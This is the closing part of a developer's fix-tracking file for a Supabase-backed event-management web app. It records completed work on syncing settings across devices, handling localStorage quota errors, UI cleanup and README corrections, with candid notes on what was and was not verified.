### [x] 4.5 Per-device data that should be shared

> **DONE — 2026-08-23.** Moved to Supabase rather than merely documented, with a fallback so
> nothing breaks before the SQL is run.
>
> **`settings-table.sql`** (new) creates `public.settings` — `key text primary key`,
> `value jsonb`, `updated_at` kept honest by a trigger — with the same
> `authenticated`-only / `anon`-nothing policy as every other table.
>
> **Client:** a small layer next to `db()`:
> - `saveSetting(key, value)` writes localStorage **and** upserts to Supabase
>   (`POST settings?on_conflict=key` with `Prefer: resolution=merge-duplicates`).
>   `db()` gained an optional 4th `prefer` argument for this; all existing 3-arg callers
>   are unaffected.
> - `applySettingsRows(rows)` runs in `loadAll` **before the first render** (CATS drives the
>   inventory tabs) and copies each server row into the in-memory array + localStorage cache.
> - The settings fetch is a 4th promise in the existing `Promise.all` that **never rejects**.
>   Until `settings-table.sql` is run, it logs one warning and every device keeps its local
>   lists — so this is safe to deploy before the SQL.
>
> All eight mutation sites now go through `saveSetting`: cost-column add/delete, category
> add/delete/reassign, package save/delete, media-category add/delete. The one deliberate
> exception is the `"Others"` bootstrap at `5624`, which runs before login — pushing it to the
> server there would just 401. `applySettingsRows` re-asserts that invariant (and `"All"` for
> `MEDIA_CATS`) after every load instead.
>
> Category discovery from inventory now calls `saveSetting("ev_cats", CATS)`, so a category
> created on one device propagates instead of dying in that browser. Deletion propagates too
> now — with the caveat that a category still in use by an inventory item is re-discovered on
> the next load, which is the correct behaviour.
>
> **Staff `ls_…` fallback — deleted, both halves.** The add path minted
> `{ id: "ls_" + Date.now() }` on failure, which existed on one device, could never be deleted
> server-side, and was indistinguishable from a real member in the assign list. The delete path
> was worse: it spliced locally and toasted *"Staff removed"* even when the request failed, so
> the member reappeared on the next reload. Both now report the error and leave state untouched
> (same rule as 1.1). `ev_staff` is no longer written; it survives only as a read fallback for
> an unreachable staff table, so legacy `ls_` rows disappear on the next reload.
>
> **Verification:** `applySettingsRows` was extracted and exercised over 11 inputs — table
> missing (`null`), empty result, normal array, value arriving as a JSON *string*, empty array
> rejected for `ev_cats`/`ev_cost_cols`/`ev_m_cats` but allowed for `ev_pkgs`, `MEDIA_CATS`
> missing `"All"`, unknown key, non-array value, unparseable string, and a `null` row.
> All behaved as designed. `node --check` passes. Not click-tested, and **not run against a
> real `settings` table** — the upsert syntax is PostgREST-standard but unverified live.
**Where:** `PACKAGES` (`9553`), `MEDIA_CATS` (`10560`), `CATS` (`9157`), `COST_COLS` (`5626`), staff
fallback (`9509`)

These live in localStorage while everything else is in Supabase. Two people using the app see different
categories, packages and cost columns. The staff fallback at `9509` is worse — it creates records with
`ls_…` ids that can never be deleted server-side.

**Fix:** move these to Supabase tables, or at minimum document that they're device-local so nobody is
surprised. `CATS` is partially self-healing (`6653` merges categories discovered on inventory items) but
deletions never propagate.

### [x] 4.6 `saveDraft` can throw on localStorage quota

> **DONE — 2026-08-23.** `saveDraft` now degrades in three steps instead of throwing:
> full payload → retry with `curEventInspos` emptied → `removeItem` the stale draft to free
> room and retry the text-only payload. Only if all three fail does it give up, and then it
> `console.error`s and toasts **once** (`draftQuotaWarned`) — it is wired to `oninput` on 11
> fields, so an un-gated warning would fire on every keystroke.
>
> The middle step matters because the photos are the only large part of the payload: a draft
> that would not fit with them still fits without them, so the typed text survives. Dropping
> the stale entry before the last retry is what makes recovery possible at all — the previous
> (larger) draft is otherwise still occupying the quota it needs.
>
> **Verification:** the function was extracted and run against a fake `localStorage` with an
> enforced byte cap over five scenarios — roomy, only-text-fits, nothing-fits, a stale oversized
> draft blocking the write, and no inspos at all. Photos are kept when they fit, dropped when
> they don't, the stale-draft case recovers to a saved text draft, and the hopeless case toasts
> exactly once across two calls with nothing thrown. `node --check` passes. Not click-tested.
**Where:** `7078`–`7090`

Stores up to 4 base64 images with no try/catch. A `QuotaExceededError` propagates out of whatever input
handler called it (it's wired to `oninput` on 11 fields at `7296`).

**Fix:** wrap the `setItem` in try/catch and drop `curEventInspos` from the payload on failure.

---

## Phase 5 — Cosmetic / cleanup

> **DONE — 2026-08-24.** All twelve items. Three needed a decision and got one (noted inline).
> Verified with `node --check` on the extracted inline script; not click-tested in a browser.

- [x] `9946` — literal **U+FFFD replacement character** in the UI: `'>?️ Clear All Items<'`.
      Replaced with `&#128465;`, matching the rest of the file's escaping style.
- [x] `6934`–`6935` — calendar legend finished and the stray unbalanced `</div>` removed.
      The dot logic only ever produces `dot-green` or `dot-red` (`dot-blue` / `dot-gold` exist
      in the CSS but nothing assigns them), so the legend lists exactly those two — **Ready**
      and **Incomplete**. Its container div is what replaced the orphan closing tag, so the
      markup now balances.
- [x] `6800` — greeting is now Morning / Afternoon / **Evening** (`hr < 12` / `hr < 17` / else).
- [x] `8495`–`8543` — dispatch-hub drag-to-reorder **removed** (user's call). It only moved DOM
      nodes; nothing was persisted and the next `rDispatchHub()` put everything back. It was
      also desktop-only, since HTML5 drag events never fire on touch — on phones the feature
      did nothing whatsoever. Gone: the four listeners, `getDragAfterElement`, `draggable='true'`,
      and the now-unused `.dc.dragging` / `cursor:move` CSS. A comment at the old site records
      that reinstating it properly needs a `bookings.sort_order` column.
- [x] `8412`, `8418` — `*Email:*` and `*Guests:*` **dropped from the WhatsApp summaries**
      (user's call). No form field ever captured them, so both always printed `-`. Three lines
      removed across two message builders. The README still needs the matching correction.
- [x] `9266` — `openEditItem` no longer silently recategorises. Assigning a `value` the
      `<select>` has no option for leaves it blank (`selectedIndex` -1), so saving an item whose
      category had been deleted on this device would quietly move it. The orphaned category is
      now re-added as an option and re-selected.
- [x] `10378` — media search null-guarded: `m.title`, `m.cat` and each tag go through
      `String(x || "")`. A null column used to throw and blank the grid.
- [x] Duplicate static elements deleted: the second `#print-sheet` and second `#logo-file`
      (only the first of each is ever reachable via `getElementById`). `#desk-logo-file` went
      with them — same block, and it is referenced nowhere in the file.
- [x] Duplicate global keydown validators **merged into one**. Care was needed here: the two
      disagreed. The first blocked `e`/`E`/`+`/`-` on *every* number input; the second blocked
      `-` only when `min >= 0` was present, and several number inputs carry no `min` at all —
      so keeping only the second would have started allowing negatives in those fields. The
      merged handler blocks `e`/`E`/`+` always and blocks `-` unless the field opts into
      negatives with an explicit `min` below zero.
- [x] Dead code removed: `missingInfo` (both sites), the duplicate `var ext` in `rBkns`, the
      duplicate `var bar` in both reserve grids, the unused `ex` in `loadDraft`, and the
      `data-mid-sel` attribute — media selection goes through `[data-mid]` on the outer card,
      so `data-mid-sel` was written but never read.
- [x] `quoteInfo.phone` — a **Client Phone field was added** to the quote form (user's call),
      next to Client Name, bound through the existing `.qt-info` handler and persisted by
      `saveQuoteDraft` with the rest of `quoteInfo`. The `goWA(quoteInfo.phone || "", msg)`
      call that was already there now actually addresses someone.
      *Caveat:* `getWaUrl` strips non-digits but adds no country code, so a local `03001234567`
      is passed through as-is and WhatsApp wants `923001234567`. Pre-existing behaviour shared
      with every other phone path in the app, not introduced here.
- [x] `finalTotal` — `manualTotal > 0` made a deliberate manual total of **0** (a complimentary
      quote) impossible: it fell back to the calculated sum. Replaced at all three sites by one
      `quoteFinalTotal(calculatedTotal)` helper that falls back only when the box is **blank**
      or unparseable, not when it holds a valid zero.

---

## README corrections

> **DONE — 2026-08-24.** All six items, plus the neighbouring sections they made inconsistent.

- [x] "Zero Dependencies / Offline-First / localStorage for data persistence" — rewritten. The
      highlights now say cloud-backed and multi-device, and a new **Where Data Lives** table in the
      architecture section splits Supabase tables / R2 / localStorage explicitly.
- [x] "Default password: `happenings2024`" — replaced with Supabase email/password, users created in
      the dashboard, and a note that reset only works for the one hardcoded `ALLOWED_RESET_EMAIL`.
- [x] Backup/import instructions — the DevTools-and-localStorage ritual is gone, replaced by CSV
      export / `pg_dump` / PITR. The localStorage section now lists the 12 keys the app *actually*
      writes (drafts and UI state), taken from the source rather than from memory.
- [x] File structure — now lists `api/get-upload-url.js`, `vercel.json`, both `.sql` files and this
      file. Prerequisites and Deployment Notes were corrected to match: the five `R2_*` env vars are
      documented in a table under First-Time Setup, along with the two SQL scripts that must be run.
- [x] Data-structure example — replaced with the real column names from the insert at `7984`
      (`dispatch_items`, `pending_items`, `costs`, `reminder_notes`, …). `email` and `guests` are
      gone from both the example and the "Creating a Booking" steps.
- [x] "No API endpoints — all functionality is client-side" — corrected to name `/api/get-upload-url`
      and the Supabase REST layer. The blanket "no environment variables needed" claim went with it.

Two things were fixed beyond the six listed, both consequences of the above:

- The sample WhatsApp booking confirmation used a `HPN-20240101-1234` reference and a `*Guests:*`
  line. Neither exists — the real format is `HAP<YYYYMMDD>-NNN` (`7964`) and the message carries
  Ready/Pickup times instead (`8627`). Updated to match the builder verbatim.
- **Data Security** claimed "data is stored locally, no external servers". It now states the
  opposite, and carries the two caveats that matter: RLS must actually be applied because the anon
  key is readable in page source, and the finance PIN is a speed bump rather than a control.
  *(That last line is a description of the current state, not a resolution of 2.3 — that decision is
  still open.)*

---

## Suggested order of work

1. ~~**0.1** — verify RLS.~~ Audited, and `db()` now sends the session token — but the **server half
   is still outstanding**: `rls-policies.sql` has not been run and the anon key has not been rotated.
   Nothing else matters while the database is world-writable.
2. ~~**1.1 → 1.6**~~ — done, one batch.
3. ~~**2.1 + 2.2**~~ — done, `esc()` added and ~248 call sites wrapped.
4. ~~**3.1 → 3.11**~~ — done, the whole phase rather than just the quick six.
5. ~~**4.1**~~ — done, startup failures are loud and top-level bindings are guarded.
6. ~~**4.2**~~ — done, all static-element binders are idempotent.
7. ~~**4.3**~~ — done, pagination enabled at 60/page.
8. ~~**4.4**~~ — done, endpoint written; **the `R2_*` env vars and bucket CORS are still on you**.
9. ~~**4.5**~~ — done; **`settings-table.sql` still needs running**.
10. ~~**4.6**~~ — done, `saveDraft` degrades instead of throwing.
11. ~~**Phase 5**~~ — done, all twelve items.
12. ~~**README corrections**~~ — done, all six plus two knock-on fixes.
13. ~~**2.3**~~ — decided: speed bump, hardened, and documented as such.

Every item in this file is now closed in code. The three operational steps listed under **Status**
are all that remain, and none of them can be done from the repo.
